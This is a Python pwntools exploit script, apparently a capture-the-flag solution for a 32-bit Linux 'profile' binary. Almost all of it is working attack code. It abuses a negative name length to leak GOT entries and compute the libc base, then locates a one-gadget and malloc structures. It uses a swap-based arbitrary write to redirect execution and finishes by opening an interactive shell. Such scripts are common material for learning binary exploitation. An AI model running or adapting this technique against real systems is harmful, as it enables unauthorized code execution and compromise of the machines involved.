#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import binascii
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')


localMAGIC=0x5fbc6
localmain_arena=0x001B2780

def debug(addr = '0x08048BA6'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,sysmbol,offset):
    if sysmbol=='min':
        return eval(prog_addr)-offset
    else:
        return eval(prog_addr) + offset

def leak(address):
    payload = p32(address) + 'a' * 4 + p32(10)
    #io.recv()
    io.sendline('3')
    io.recvuntil('Input your new namelen:\n')
    io.sendline('-10')
    io.recvuntil('Input your name:\n')
    io.sendline(payload)
    io.recvuntil('Input your age:\n')
    io.sendline('10')
    io.recvuntil('Update succeeded\n')

    io.recvuntil(">")
    io.sendline('2')
    data=io.recv().splitlines()[0][11:15][::-1]
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data

def getshell(address1,address2,address3):


    # io.recvuntil('>')
    io.sendline('4')
    io.recvuntil('Person 1:')
    io.send(p32(address1 - 0xc))
    io.recvuntil('Person 2:')
    io.send(p32(address2))


    #payload = 'b'*0x4
    io.recvuntil('>')
    io.send('3')
    io.recv()
    io.sendline('20')
    io.recvuntil('Input your name:\n')
    io.sendline(address3)
    io.recvuntil('Input your age:\n')
    io.sendline('10')
    io.recvuntil('Update succeeded\n')






libc=ELF('/lib/i386-linux-gnu/libc.so.6')
symbols = ['environ', '_environ', '__environ']
for symbol in symbols:
    environ = libc.symbols[symbol]
print "environ:"+hex(environ)
head=libc.symbols['__curbrk']
print "head:"+hex(head)
system=libc.symbols['system']
print "system:"+hex(system)
__malloc_hook=libc.got['__malloc_hook']
print "__malloc_hook:"+hex(__malloc_hook)


elf = ELF('/home/h11p/hackme/huxiangbei/profile')
printf_addr=elf.got['printf']
puts_addr=elf.got['puts']
atoi_addr=elf.got['atoi']
malloc_addr=elf.got['malloc']
__isoc99_scanf_addr=elf.got['__isoc99_scanf']
read_addr=elf.got['read']
print "printf_addr:"+hex(printf_addr)
print "puts_addr:"+hex(puts_addr)
print "atoi_addr:"+hex(atoi_addr)
print "malloc_addr:"+hex(malloc_addr)
print "__isoc99_scanf_addr:"+hex(__isoc99_scanf_addr)
print "read_addr:"+hex(read_addr)

io = process('/home/h11p/hackme/huxiangbei/profile')

#debug()

io.recvuntil('>')
io.sendline("1")
io.recvuntil("Input your name len:\n")
io.sendline("10")
io.recvuntil('Input your name:\n')
io.sendline('a'*8)
io.recvuntil('Input your age:\n')
io.sendline('1'*12)
io.recvuntil('Profile Created\n')

libc_base=base_addr("0x"+binascii.b2a_hex(leak(printf_addr)),'min',0x49670) #0x49670
print "libc_base:"+hex(libc_base)
MAGIC_addr=libc_base+localMAGIC
print "MAGIC_addr:"+hex(MAGIC_addr)
environ_addr=libc_base+environ
print "environ_addr:"+hex(environ_addr)
head_addr=libc_base+head
print "head_addr:"+hex(head_addr)
main_arena_addr=libc_base+localmain_arena
print "main_arena_addr:"+hex(main_arena_addr)
topchunk=main_arena_addr+0x30
print "topchunk:"+hex(topchunk)
system_addr=libc_base+system
print "system_addr:"+hex(system_addr)
__malloc_hook_addr=libc_base+__malloc_hook
print "__malloc_hook_addr:"+hex(__malloc_hook_addr)

'''
libc_start_main=base_addr("0x"+binascii.b2a_hex(leak(environ_addr)),'min',0xa0)
print "libc_start_main:"+hex(libc_start_main)
head_addr_input=base_addr('0x'+binascii.b2a_hex(leak(head_addr+1))+'00','min',0x20fe8)
print "head_addr_input:"+hex(head_addr_input)
'''


getshell(topchunk,0x0804B004-0x8,'a'*8+p32(MAGIC_addr))


'''
io.sendline("4")
io.recvuntil('Person 1:')
io.send(p32(puts_addr-0xc))
io.recvuntil('Person 2:')
io.send(p32(MAGIC_addr))
'''


io.interactive()
io.close()

